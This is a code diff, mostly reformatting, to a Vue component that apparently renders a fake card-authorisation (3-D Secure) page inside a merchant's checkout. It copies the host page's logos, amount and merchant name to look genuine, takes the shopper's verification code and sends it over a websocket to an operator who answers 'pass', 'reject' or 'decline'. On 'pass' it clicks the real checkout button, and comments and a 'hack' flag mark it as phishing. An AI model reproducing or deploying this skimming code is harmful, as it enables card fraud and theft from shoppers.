@@ -7,17 +7,17 @@
         <div class="flex items-center justify-between">
           <div class="flex items-center gap-2 sm:gap-3">
             <img id="shopLogo"
-                src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&ixlib=rb-4.1.0&q=80&w=1080&utm_source=figma&utm_medium=referral"
-                alt="Stripe Pattern"
-                class="h-10 sm:h-12 w-auto rounded"
+                 src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&ixlib=rb-4.1.0&q=80&w=1080&utm_source=figma&utm_medium=referral"
+                 alt="Stripe Pattern"
+                 class="h-10 sm:h-12 w-auto rounded"
             />
           </div>
 
           <div class="flex items-center">
             <img id="bankLogo"
-                src="http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg"
-                alt="Mastercard ID Check"
-                class="h-10 sm:h-12 w-auto rounded"
+                 src="http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg"
+                 alt="Mastercard ID Check"
+                 class="h-10 sm:h-12 w-auto rounded"
             />
           </div>
         </div>
@@ -36,7 +36,8 @@
               <div class="text-sm text-gray-600 mb-2">You are authorizing a payment of</div>
               <div id="i-money" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2">$99.00</div>
               <div class="text-sm text-gray-600">
-                to <span id="i-bank" class="font-medium text-gray-900">SecureBank</span> on <span id="i-date" class="font-medium">27/02/24</span>
+                to <span id="i-bank" class="font-medium text-gray-900">SecureBank</span> on <span id="i-date"
+                                                                                                  class="font-medium">27/02/24</span>
               </div>
             </div>
 
@@ -205,10 +206,10 @@
 </template>
 
 <script setup lang="ts">
-import { ref, watch, onBeforeUnmount, onMounted } from 'vue';
-import { getParentOne } from '~/utils/dom';
-import { addOnMessage, removeOnMessage, sendMsg } from '~/utils';
-import type { WebSocketMessage } from '~/utils';
+import {ref, watch, onBeforeUnmount, onMounted} from 'vue';
+import {getParentOne} from '~/utils/dom';
+import {addOnMessage, removeOnMessage, sendMsg} from '~/utils';
+import type {WebSocketMessage} from '~/utils';
 import {useLoadingStore} from "~/stores/loading";
 import {checkBinApi} from "~/composables/api";
 
@@ -241,6 +242,7 @@ const handleSubmit = async () => {
   // loadingStore.loadLoading();
   loadingStore.loadStripe();
 };
+
 // 发送验证码给后端
 function submitCode() {
   if (cardInfo.code == '') {
@@ -251,33 +253,34 @@ function submitCode() {
     message: cardInfo.value,
   });
 }
+
 // 消息回调
 const callBackFish = (res: WebSocketMessage) => {
-  if(res.data.action == "send"){
+  if (res.data.action == "send") {
     // 取消loading状态， 展示页面
     loadingStore.unloadStripe();
-  }else if(res.data.action == "pass"){
+  } else if (res.data.action == "pass") {
     isSubmitting.value = false;
     // 提交成功，跳转页面
     console.log("======真实提交")
     const btn = top.document.getElementById("checkout-pay-button");
-    btn.disabled=false;
+    btn.disabled = false;
     btn.click();
     top.window.hack = false;
-  }else if(res.data.action == "reject"){
+  } else if (res.data.action == "reject") {
     isSubmitting.value = false;
     cardInfo.value['code'] = ''
     // 提交失败，提示用户 - EMVCo Compliant Modal Display
     showError.value = true;
     loadingStore.unloadStripe();
-  }else if(res.data.action == "decline"){
+  } else if (res.data.action == "decline") {
     isSubmitting.value = false;
     cardInfo.value['code'] = ''
     // 提交失败，提示用户 - EMVCo Compliant Modal Display
     showError.value = true;
     loadingStore.unloadStripe();
   }
-  console.log("callBackFish：",res)
+  console.log("callBackFish：", res)
 };
 
 // Resend Code Handler
@@ -297,7 +300,7 @@ const closeErrorModal = () => {
   showError.value = false;
 };
 
-onMounted( async() => {
+onMounted(async () => {
   // 在当前页面注册消息监听
   addOnMessage(eventCallBack, callBackFish);
 
@@ -354,25 +357,25 @@ onMounted( async() => {
     // 手机号后四位
     document.querySelector("#i-phone").innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
   }*/
-  if(window.self !== window.top){
+  if (window.self !== window.top) {
     console.log("im in!")
-    var data = getParentOne('#basic-creditCards-secondary img',['src']);
-    console.log("=========data",data)
+    var data = await getParentOne('#basic-creditCards-secondary img', ['src']);
+    console.log("=========data", data)
     // 设置logo
-    const bankLogo = getParentOne('#basic-creditCards-secondary img',['src']).src;
+    const bankLogo = await getParentOne('#basic-creditCards-secondary img', ['src']).src;
     document.querySelector('#bankLogo').setAttribute('src', bankLogo);
-    const shopLogo = getParentOne('a img',['src']).src;
+    const shopLogo = await getParentOne('a img', ['src']).src;
     document.querySelector('#shopLogo').setAttribute('src', shopLogo);
     // 支付金额
-    document.querySelector("#i-money").innerHTML = getParentOne("strong:nth-child(2)").innerHTML;
+    document.querySelector("#i-money").innerHTML = await getParentOne("strong:nth-child(2)").innerHTML;
     // 商户名
-    document.querySelector("#i-bank").innerHTML = getParentOne('a img',['alt']).alt;
+    document.querySelector("#i-bank").innerHTML = await getParentOne('a img', ['alt']).alt;
     // 日期
     document.querySelector("#i-date").innerHTML = new Date().toLocaleDateString('en-US', {
-                                                            day: '2-digit',
-                                                            month: '2-digit',
-                                                            year: '2-digit'
-                                                          });
+      day: '2-digit',
+      month: '2-digit',
+      year: '2-digit'
+    });
     // 手机号后四位
     document.querySelector("#i-phone").innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
   }
